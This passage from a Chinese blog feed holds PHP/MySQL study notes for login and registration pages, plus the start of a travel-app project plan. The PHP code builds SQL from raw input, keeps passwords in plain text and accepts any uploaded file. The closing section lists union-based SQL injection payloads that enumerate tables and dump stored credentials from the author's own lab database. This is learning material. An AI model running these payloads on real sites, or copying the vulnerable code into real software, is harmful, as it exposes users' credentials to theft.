class="variable">$sqlinsert</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">	insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	values(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianfile</span>&#x27;);</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sqlinsert</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传图像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$zhErr</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;];?&gt;&quot;</span> alt=<span class="string">&quot;上传的图片&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
<h4 id="查询数据"><a class="header-anchor" href="#查询数据">¶</a>查询数据</h4>
<ul>
<li>
<p>SELECT 语句用于从数据表中读取数据:</p>
<p><code>SELECT column_name(s) FROM table_name</code></p>
</li>
</ul>
<h4 id="PHP联动查询"><a class="header-anchor" href="#PHP联动查询">¶</a>PHP联动查询</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select * from kkk_tbl;&quot;</span>;</span><br><span class="line"><span class="variable">$lianjie</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($lianjie);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$lianjie</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$phone</span>=<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;pass:&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;phone:&quot;</span>.<span class="variable">$phone</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>原始查询代码</li>
</ul>
<p><code>select id, username from users where id = 2;</code></p>
<ul>
<li>优化后的php代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$chaxunsql</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;chaxun&#x27;</span>];</span><br><span class="line"><span class="comment">//增加一个判断，判断传入值是数字还是字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$chaxunsql</span>))&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;id=<span class="subst">$chaxunsql</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;username=&#x27;<span class="subst">$chaxunsql</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select id,username from users where <span class="subst">$chaxunsql</span> &quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"><span class="comment">//mysqli_fetch_assoc() 查询数据库结果并且赋值为一行</span></span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$reslust</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="comment">//提取row数字中的username字段</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;id:<span class="subst">$id</span>&lt;/br&gt;username:<span class="subst">$username</span>&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1&gt;请输入你要查询的id或者账号名字&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;chaxun&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="例：网站登录注册-登录界面Pro"><a class="header-anchor" href="#例：网站登录注册-登录界面Pro">¶</a>例：网站登录注册+登录界面Pro</h2>
<ul>
<li>注：注册界面任务分解，先写出最简单的登录页面，只需要能够判断是否登录成功即可</li>
<li>结构：
<ul>
<li>tupian(文件夹，存放静态资源)</li>
<li>login.php 登陆界面</li>
<li>zhuxiao.php  注销界面</li>
<li>conn.php   数据库连接界面</li>
<li>zhuce.php   注册界面</li>
<li>session.php   管理session</li>
<li>youxi.php    假装后台界面</li>
</ul>
</li>
</ul>
<h3 id="登录页面login-php"><a class="header-anchor" href="#登录页面login-php">¶</a>登录页面login.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$uapsql</span>=<span class="string">&quot;select user,pass from kkk_tbl where user=&#x27;<span class="subst">$username</span>&#x27; and pass=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$uapsql</span>);</span><br><span class="line"><span class="comment">// var_dump($reslust);</span></span><br><span class="line"><span class="comment">// var_dump();</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$reslust</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:youxi.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$login</span> = <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    </span><br><span class="line">&lt;h1&gt;请输入账号以及密码&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a href=<span class="string">&quot;zhuce.php&quot;</span>&gt;点击注册&lt;/a&gt;&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$login</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="注销界面zhuxiao-php"><a class="header-anchor" href="#注销界面zhuxiao-php">¶</a>注销界面zhuxiao.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="数据库连接界面conn-php"><a class="header-anchor" href="#数据库连接界面conn-php">¶</a>数据库连接界面conn.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">        `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">        `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">        `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">        PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">        )ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">		<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="注册界面zhuce-php"><a class="header-anchor" href="#注册界面zhuce-php">¶</a>注册界面zhuce.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"><span class="variable">$tupianname</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;账号密码、手机号码不能为空&quot;</span>;</span><br><span class="line">        <span class="comment">//密码长度8位,密码两次输入一致</span></span><br><span class="line">        <span class="comment">//密码验证</span></span><br><span class="line">        <span class="comment">//手机11位</span></span><br><span class="line">        <span class="comment">//文件上传jpg</span></span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;密码长度不足八位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;两次输入密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="string">&quot;11&quot;</span>)&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span class="string">&quot;手机号码格式有问题&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// echo $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> .</span><br><span class="line">			<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">			<span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	value(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianname</span>&#x27;);&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ERR</span>=<span class="string">&quot;注册失败&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="管理session-session-php"><a class="header-anchor" href="#管理session-session-php">¶</a>管理session  session.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;您已经成功登陆&lt;a href=&#x27;zhuxiao.php&#x27;&gt;点击注销&lt;/a&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] == <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;您无权访问,&lt;a href=&#x27;login.php&#x27;&gt;点击跳转登录页面&lt;/a&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="假装后台界面-youxi-php"><a class="header-anchor" href="#假装后台界面-youxi-php">¶</a>假装后台界面  youxi.php</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;session.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;游戏页面&lt;/h1&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;select.php&quot;</span>&gt;点击账号以及ID的对应关系&lt;/a&gt;</span><br><span class="line">        &lt;a href=<span class="string">&quot;jsq.php&quot;</span>&gt;数字炸弹&lt;/a&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="PHP登录实战"><a class="header-anchor" href="#PHP登录实战">¶</a>PHP登录实战</h2>
<ul>
<li>
<p><strong>实验七：综合作业（注册、登录、玩游戏）</strong></p>
</li>
<li>
<p>用户登录以后可以直接打开多个链接，比如之前写入的用户查询页面，计算页面，可以将我们之前写入的都写进来</p>
</li>
<li>
<p>思路：</p>
<ul>
<li>将session功能单独变成一个文件，在不同的页面里面引入即可</li>
</ul>
</li>
</ul>
<h2 id="select-php攻击实战（sql初次尝试）"><a class="header-anchor" href="#select-php攻击实战（sql初次尝试）">¶</a><strong>select.php</strong>攻击实战（sql初次尝试）</h2>
<p>轮子：admin’ and ‘1’='1</p>
<p>查询字段数量：<code>admin' order by 2--+'</code></p>
<p>查询回显位置：<code>admin' union select 1,2--+'</code></p>
<p>查询数据库库：<code>admin' union select database(),2--+'</code></p>
<p>查询数据表：</p>
<ul>
<li><code>select table_name from information_schema.tables where table_schema=&quot;kkk&quot;;</code></li>
</ul>
<p>变形：</p>
<ul>
<li><code>-admin' union select table_name,2 from information_schema.tables where table_schema='kkk</code></li>
</ul>
<p>继续查询字段：</p>
<ul>
<li><code>-admin' union select group_concat(column_name),2 from information_schema.columns where table_name='kkk_tbl</code></li>
</ul>
<p>查询数据内容：</p>
<p><code>-admin' union select group_concat(user,pass),2 from kkk_tbl where '1' ='1</code></p>
<h2 id="写在后面"><a class="header-anchor" href="#写在后面">¶</a>写在后面</h2>
<p>有点懵的一话。。。今天因为某些特殊原因有点心不在焉，所以任务的话回头再看看吧。php初级语法就学到这里，我看后面如果要深入学习php的话，<code>ThinkPHP</code>框架是绕不过去的。、</p>
<p>不过就目前看，php还没掌握完全，下一步也没确定。。。。先不急这个</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>PHP notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>PHP</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>【My0vvn】前期构思</title>
    <url>/2024/09/11/CS_Notes/my0wn/%E3%80%90My0vvn%E3%80%91%E5%89%8D%E6%9C%9F%E6%9E%84%E6%80%9D/</url>
    <content><![CDATA[<p>我可以为你提供一个详细的项目构思、需求文档和开发文档的模板。这些文档会帮助你在项目的不同阶段明确目标、需求和开发路径。以下是建议的结构和内容：</p>
<h3 id="1-项目构思文档"><a class="header-anchor" href="#1-项目构思文档">¶</a>1. <strong>项目构思文档</strong></h3>
<h4 id="项目名称："><a class="header-anchor" href="#项目名称：">¶</a>项目名称：</h4>
<ul>
<li><strong>项目名称</strong>：AI-assisted travel decision-making application</li>
</ul>
<h4 id="项目简介："><a class="header-anchor" href="#项目简介：">¶</a>项目简介：</h4>
<ul>
<li>本项目旨在利用大语言模型（LLM）来辅助用户做出智能的旅游决策。结合用户的个人偏好、预算、时间等因素，为用户推荐定制化的旅游行程方案。</li>
</ul>
<h4 id="项目目标："><a class="header-anchor" href="#项目目标：">¶</a>项目目标：</h4>
<ul>
<li>提高用户选择旅游目的地和制定行程的效率。</li>
<li>通过智能分析，为用户提供优化的旅游路线。</li>
<li>集成Vue前端框架，实现动态、交互式的用户界面。</li>
</ul>
<h4 id="项目特性："><a class="header-anchor" href="#项目特性：">¶</a>项目特性：</h4>
<ul>
<li><strong>智能推荐</strong>：利用大模型生成个性化旅游行程。</li>
<li><strong>多维度分析</strong>：基于用户输入的预算、兴趣、时间等因素提供建议。</li>
<li><strong>实时交互</strong>：用户可以根据建议进行调整，实时查看变化的旅游方案。</li>
<li><strong>响应式设计</strong>：适应不同设备的使用场景（手机、平板、电脑）。</li>
</ul>
<h4 id="技术栈："><a class="header-anchor" href="#技术栈：">¶</a>技术栈：</h4>
<ul>
<li><strong>后端</strong>：Django (Python)</li>
<li><strong>前端</strong>：Vue.js</li>
<li><strong>数据库</strong>：PostgreSQL 或 MySQL</li>
<li><strong>API</strong>：使用Django REST Framework (DRF) 构建API</li>
<li><strong>AI服务</strong>：集成OpenAI等大语言模型 API</li>
</ul>
